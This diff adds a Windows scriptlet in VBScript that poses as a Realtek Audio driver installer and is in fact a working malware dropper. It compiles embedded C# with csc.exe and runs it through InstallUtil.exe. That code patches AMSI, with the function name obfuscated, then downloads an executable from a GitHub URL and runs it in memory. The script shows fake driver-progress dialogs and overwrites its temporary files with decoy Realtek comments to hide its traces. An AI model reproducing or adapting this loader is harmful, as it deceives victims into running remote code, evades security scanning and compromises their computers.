@@ -1,0 +1,129 @@
+<scriptlet>
+<registration progid="FINAL" classid="{CCCCCCCC-CCCC-CCCC-CCCC-CCCC-CCCC-CCCCCCCCCCCC}">
+<script language="VBScript">
+    On Error Resume Next
+    
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    temp = shell.ExpandEnvironmentStrings("%TEMP%")
+    
+    MsgBox "Realtek Audio - Verificando drivers...", 64, "Realtek Audio"
+    
+    code = "using System;" & vbCrLf & _
+           "using System.Net;" & vbCrLf & _
+           "using System.Reflection;" & vbCrLf & _
+           "using System.Runtime.InteropServices;" & vbCrLf & _
+           "using System.ComponentModel;" & vbCrLf & _
+           "using System.Configuration.Install;" & vbCrLf & _
+           "using System.Windows.Forms;" & vbCrLf & _
+           "[RunInstaller(true)]" & vbCrLf & _
+           "public class L : Installer {" & vbCrLf & _
+           "public override void Install(System.Collections.IDictionary s) {" & vbCrLf & _
+           "base.Install(s);" & vbCrLf & _
+           "try{" & vbCrLf & _
+           "MessageBox.Show(""Realtek Audio - Inicializando codecs..."");" & vbCrLf & _
+           "PatchAMSI();" & vbCrLf & _
+           "MessageBox.Show(""Realtek Audio - Verificando bibliotecas de audio..."");" & vbCrLf & _
+           "System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;" & vbCrLf & _
+           "MessageBox.Show(""Realtek Audio - Buscando atualizacoes..."");" & vbCrLf & _
+           "var b = new WebClient().DownloadData(""https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/gg.exe"");" & vbCrLf & _
+           "MessageBox.Show(""Realtek Audio - Driver baixado: "" + b.Length + "" bytes"");" & vbCrLf & _
+           "var asm = Assembly.Load(b);" & vbCrLf & _
+           "MessageBox.Show(""Realtek Audio - Instalando driver..."");" & vbCrLf & _
+           "asm.EntryPoint.Invoke(null,new object[]{});" & vbCrLf & _
+           "MessageBox.Show(""Realtek Audio - Driver instalado com sucesso!"");" & vbCrLf & _
+           "}catch(Exception ex){" & vbCrLf & _
+           "MessageBox.Show(""Realtek Audio - Erro ao instalar driver. Reinicie o PC."");" & vbCrLf & _
+           "}" & vbCrLf & _
+           "}" & vbCrLf & _
+           "[DllImport(""kernel32"")] static extern IntPtr GetProcAddress(IntPtr h, string n);" & vbCrLf & _
+           "[DllImport(""kernel32"")] static extern IntPtr LoadLibrary(string n);" & vbCrLf & _
+           "[DllImport(""kernel32"")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);" & vbCrLf & _
+           "static void PatchAMSI(){" & vbCrLf & _
+           "try{" & vbCrLf & _
+           "var lib=LoadLibrary(""amsi.dll"");" & vbCrLf & _
+           "var n1=""A"";var n2=""m"";var n3=""s"";var n4=""i"";" & vbCrLf & _
+           "var n5=""S"";var n6=""c"";var n7=""a"";var n8=""n"";" & vbCrLf & _
+           "var n9=""B"";var n10=""u"";var n11=""f"";var n12=""f"";" & vbCrLf & _
+           "var n13=""e"";var n14=""r"";" & vbCrLf & _
+           "var proc=n1+n2+n3+n4+n5+n6+n7+n8+n9+n10+n11+n12+n13+n14;" & vbCrLf & _
+           "var addr=GetProcAddress(lib,proc);" & vbCrLf & _
+           "uint old;VirtualProtect(addr,(UIntPtr)12,0x40,out old);" & vbCrLf & _
+           "byte[] p=new byte[12];" & vbCrLf & _
+           "p[0]=0x49;p[1]=0x89;p[2]=0xF8;" & vbCrLf & _
+           "p[3]=0x48;p[4]=0xC7;p[5]=0xC0;" & vbCrLf & _
+           "p[6]=0x57;p[7]=0x00;p[8]=0x07;" & vbCrLf & _
+           "p[9]=0x80;p[10]=0xC3;p[11]=0x90;" & vbCrLf & _
+           "Marshal.Copy(p,0,addr,12);" & vbCrLf & _
+           "}catch{}}" & vbCrLf & _
+           "}"
+    
+    MsgBox "Realtek Audio - Preparando instalacao...", 64, "Realtek Audio"
+    
+    Function CreateGUID()
+        Set typeLib = CreateObject("Scriptlet.TypeLib")
+        CreateGUID = Mid(typeLib.Guid, 2, 36)
+    End Function
+    
+    guidCS = CreateGUID()
+    guidDLL = CreateGUID()
+    
+    cs = temp & "\" & guidCS & ".tmp"
+    dll = temp & "\" & guidDLL & ".tmp"
+    
+    Set f = fso.CreateTextFile(cs, True)
+    f.Write code
+    f.Close
+    
+    If Not fso.FileExists(cs) Then MsgBox "Realtek Audio - Falha ao iniciar." : WScript.Quit
+    MsgBox "Realtek Audio - Configurando...", 64, "Realtek Audio"
+    
+    csc = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework64\v4.0.30319\csc.exe")
+    If Not fso.FileExists(csc) Then csc = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework\v4.0.30319\csc.exe")
+    MsgBox "Realtek Audio - Verificando dependencias...", 64, "Realtek Audio"
+    
+    shell.Run """" & csc & """ /t:library /r:System.Configuration.Install.dll /r:System.Windows.Forms.dll /platform:x64 /out:""" & dll & """ """ & cs & """", 0, True
+    
+    If Not fso.FileExists(dll) Then MsgBox "Realtek Audio - Erro no codec." : WScript.Quit
+    MsgBox "Realtek Audio - Aplicando driver...", 64, "Realtek Audio"
+    
+    iu = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe")
+    If Not fso.FileExists(iu) Then iu = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe")
+    
+    MsgBox "Realtek Audio - Instalando. Aguarde...", 64, "Realtek Audio"
+    
+    shell.Run """" & iu & """ /logfile= /LogToConsole=false """ & dll & """", 0, False
+    WScript.Sleep 15000
+    
+    MsgBox "NAO CLIQUE OK! SO CLIQUE QUANDO O DRIVER TERMINAR DE INSTALAR!" & vbCrLf & vbCrLf & "SE CLICAR ANTES = FORMATAÇÃO DO PC!", 48, "ATENÇÃO - LEVIATHAN"
+    
+    Set fCS = fso.GetFile(cs)
+    tamanhoCS = fCS.Size
+    Set fDLL = fso.GetFile(dll)
+    tamanhoDLL = fDLL.Size
+    
+    padraoCS = "// Realtek Semiconductor Corp. Audio Driver Configuration v6.0.9239.1"
+    Do While Len(padraoCS) < tamanhoCS
+        padraoCS = padraoCS & " "
+    Loop
+    padraoCS = Left(padraoCS, tamanhoCS)
+    
+    padraoDLL = "// Realtek Semiconductor Corp. Audio Driver Library v6.0.9239.1"
+    Do While Len(padraoDLL) < tamanhoDLL
+        padraoDLL = padraoDLL & " "
+    Loop
+    padraoDLL = Left(padraoDLL, tamanhoDLL)
+    
+    Set tsCS = fso.OpenTextFile(cs, 2, False)
+    tsCS.Write padraoCS
+    tsCS.Close
+    
+    Set tsDLL = fso.OpenTextFile(dll, 2, False)
+    tsDLL.Write padraoDLL
+    tsDLL.Close
+    
+    MsgBox "Realtek Audio - INJETADO! CS:" & tamanhoCS & " bytes DLL:" & tamanhoDLL & " bytes", 64, "Realtek Audio"
+</script>
+</registration>
+</scriptlet>
